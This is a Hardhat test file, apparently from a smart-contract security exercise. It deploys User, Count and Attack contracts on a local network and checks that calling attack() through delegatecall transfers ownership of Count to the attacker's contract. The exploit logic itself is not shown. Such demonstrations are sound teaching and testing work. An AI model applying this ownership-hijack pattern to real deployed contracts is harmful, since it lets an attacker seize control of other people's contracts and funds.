const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Delegatecall Attack (Change Owner)", function () {
  let user;
  let count;
  let changeOwnerAttack;
  let address_of_attack_contract;
  let deployer;
  let attacker;

  before(async function () {
    [deployer, attacker] = await ethers.getSigners();

    // Deploy the User contract
    const User = await ethers.getContractFactory("User");
    user = await User.deploy();
    await user.waitForDeployment();
    await user.connect(deployer).setOwner();

    // Deploy the Count contract
    const Count = await ethers.getContractFactory("Count");
    count = await Count.deploy(user.getAddress());
    await count.waitForDeployment();

    // Deploy the Attack contract
    const Attack = await ethers.getContractFactory("Attack");
    changeOwnerAttack = await Attack.deploy(count.getAddress());
    await changeOwnerAttack.waitForDeployment();
    address_of_attack_contract = await changeOwnerAttack.getAddress();
  });

  it("delegatecall attack to change the owner of the count", async function () {
    // Get the owner of the Count contract before the attack
    let ownerBeforeAttack = await count.owner();
    console.log("Owner of Count before attack: ", ownerBeforeAttack);

    // Perform the attack
    await changeOwnerAttack.connect(attacker).attack();

    // Get the owner of the Count contract after the attack
    let ownerAfterAttack = await count.owner();
    console.log("Owner of Count after attack: ", ownerAfterAttack);

    // You can also use expect to check that the owner has changed to the attacker's address
    expect(ownerAfterAttack).to.equal(address_of_attack_contract);
  });
});
